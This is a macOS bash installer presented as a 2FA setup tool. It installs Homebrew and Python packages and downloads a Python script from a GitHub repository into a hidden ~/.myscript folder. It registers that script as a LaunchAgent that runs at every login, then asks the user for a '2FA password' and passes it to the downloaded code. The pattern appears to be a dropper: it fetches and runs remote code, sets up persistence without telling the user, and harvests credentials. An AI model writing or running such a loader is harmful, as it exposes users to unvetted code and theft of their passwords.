#!/bin/bash

# Function to create the .myscript directory if it doesn't exist
function create_myscript_directory() {
    echo "Creating .myscript directory..."
    mkdir -p "$HOME/.myscript"
}

# Function to install Homebrew if it's not already installed
function install_homebrew() {
    echo "Checking if Homebrew is installed..."
    if ! command -v brew &>/dev/null; then
        echo "Installing Homebrew..."
        HOMEBREW_INSTALL_URL="https://raw.githubusercontent.com/Homebrew/install/master/install.sh"
        HOMEBREW_INSTALL_SCRIPT="/tmp/homebrew_install.sh"
        curl -fsSL $HOMEBREW_INSTALL_URL -o $HOMEBREW_INSTALL_SCRIPT
        /bin/bash $HOMEBREW_INSTALL_SCRIPT || display_error "Failed to install Homebrew"
        echo; echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> "$HOME/.zprofile" || display_error "Failed to add brew to .zprofile"
        eval "$(/opt/homebrew/bin/brew shellenv)" || display_error "Failed to set up Homebrew environment"
    else
        echo "Homebrew is already installed."
    fi
}

# Function to install Python with Tkinter support using Homebrew
function install_python_tkinter() {
    echo "Installing Python with Tkinter support..."
    brew install python-tk || display_error "Failed to install Python with Tkinter support"
}

# Function to install PySimpleGUI
function install_pysimplegui() {
    echo "Installing PySimpleGUI..."
    /usr/local/bin/python3 -m pip install PySimpleGUI || display_error "Failed to install PySimpleGUI"
    /usr/local/bin/python3 -m pip install requests || display_error "Failed to install Requests"
     /usr/local/bin/python3 -m pip install qrcode || display_error "Failed to install QRcode"
}

# Function to download the Python script
function download_script() {
    echo "Downloading the Python script..."
    curl -o "$HOME/.myscript/new.py" https://raw.githubusercontent.com/alwayshyper/protec/main/main.py || display_error "Failed to download the Python script"
}

# Function to create the shell script
function create_shell_script() {
    echo "Creating the shell script..."
    cat << EOF > "$HOME/.myscript/run_new_script.sh"
#!/bin/bash

# Change to the directory where your Python script is located
cd "$HOME/.myscript/"

# Replace python3 with the correct Python version if needed
/usr/local/bin/python3 new.py
EOF

    # Make the shell script executable
    chmod +x "$HOME/.myscript/run_new_script.sh"
}

# Function to install the launch agent
function install_launch_agent() {
    echo "Creating a launch agent..."
    cat << EOF > "$HOME/Library/LaunchAgents/com.$USER.run_new_script.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.$USER.run_new_script</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>/Users/$USER/.myscript/new.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
}

# Function to load the launch agent
function load_launch_agent() {
    echo "Loading the launch agent..."
    launchctl load "$HOME/Library/LaunchAgents/com.$USER.run_new_script.plist" || display_error "Failed to load the launch agent"
}

# Function to prompt the user for 2FA password
function prompt_for_2fa() {
    echo "Please enter your 2FA password:"
    read -r password
    echo "$password"
}

# Function to display an error message and exit with a non-zero status
function display_error() {
    echo "Error: $1"
    exit 1
}

# Main execution
function main() {
    create_myscript_directory
    install_homebrew
    install_python_tkinter
    install_pysimplegui
    download_script
    create_shell_script
    install_launch_agent
    load_launch_agent
    
    # Prompt the user for 2FA password after installation
    password=$(prompt_for_2fa)
    echo "Setting up 2FA..."
    python3 "$HOME/.myscript/new.py" setup_2fa "$password"
    
    echo "Setup completed successfully!"
}

# Execute main function
main
